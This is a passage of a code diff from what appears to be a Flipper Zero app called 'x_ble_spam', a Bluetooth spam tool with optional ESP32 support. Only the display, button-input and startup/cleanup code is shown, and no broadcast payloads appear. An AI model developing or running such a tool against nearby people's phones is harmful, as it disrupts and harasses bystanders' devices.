+        snprintf(idx, sizeof(idx), "%d / %d  [ESP]", m->sel + 1, DEV_COUNT);
+    else
+        snprintf(idx, sizeof(idx), "%d / %d", m->sel + 1, DEV_COUNT);
+    canvas_draw_str_aligned(canvas, 64, 34, AlignCenter, AlignCenter, idx);
+
+    // Buttons
+    elements_button_center(canvas, m->running ? "STOP" : "START");
+    elements_button_left(canvas, "< Prev");
+    elements_button_right(canvas, "Next >");
+}
+
+static bool input_cb(InputEvent* ev, void* ctx) {
+    App* app = ctx;
+    if(ev->type != InputTypeShort &&
+       ev->type != InputTypeLong &&
+       ev->type != InputTypeRepeat) return false;
+
+    bool was_running = app->running;
+
+    switch(ev->key) {
+    case InputKeyOk:
+        if(ev->type == InputTypeShort) {
+            if(app->running) do_stop(app);
+            else do_start(app);
+        }
+        break;
+    case InputKeyLeft:
+    case InputKeyUp:
+        do_stop(app);
+        app->sel = (app->sel - 1 + DEV_COUNT) % DEV_COUNT;
+        if(was_running) do_start(app);
+        break;
+    case InputKeyRight:
+    case InputKeyDown:
+        do_stop(app);
+        app->sel = (app->sel + 1) % DEV_COUNT;
+        if(was_running) do_start(app);
+        break;
+    case InputKeyBack:
+        do_stop(app);
+        view_dispatcher_stop(app->vd);
+        break;
+    default:
+        return false;
+    }
+
+    with_view_model(app->view, VM* m, {
+        m->running = app->running;
+        m->sel = app->sel;
+        m->ok = app->last_ok;
+    }, true);
+    return true;
+}
+
+// ── Main ──────────────────────────────────────────────────────────────────
+
+int32_t x_ble_spam_main(void* p) {
+    UNUSED(p);
+    App* app = malloc(sizeof(App));
+    memset(app, 0, sizeof(App));
+
+    // ESP32 boost init (transparent — NULL if no ESP32)
+    app->esp = esp_boost_init();
+
+    app->vd = view_dispatcher_alloc();
+    app->view = view_alloc();
+    view_allocate_model(app->view, ViewModelTypeLocking, sizeof(VM));
+    with_view_model(app->view, VM* m, {
+        m->running = false; m->sel = 0; m->ok = false;
+        m->esp = esp_boost_is_connected(app->esp);
+    }, false);
+    view_set_context(app->view, app);
+    view_set_draw_callback(app->view, draw_cb);
+    view_set_input_callback(app->view, input_cb);
+
+    view_dispatcher_add_view(app->vd, 0, app->view);
+    view_dispatcher_switch_to_view(app->vd, 0);
+
+    Gui* gui = furi_record_open(RECORD_GUI);
+    view_dispatcher_attach_to_gui(app->vd, gui, ViewDispatcherTypeFullscreen);
     view_dispatcher_run(app->vd);
+    furi_record_close(RECORD_GUI);
 
-    if(app->running) do_stop(app);
-
-    furi_thread_free(app->worker);
+    do_stop(app);
     view_dispatcher_remove_view(app->vd, 0);
     view_free(app->view);
     view_dispatcher_free(app->vd);
-    furi_record_close(RECORD_GUI);
 
     esp_boost_free(app->esp);
     free(app);
-
     return 0;
 }
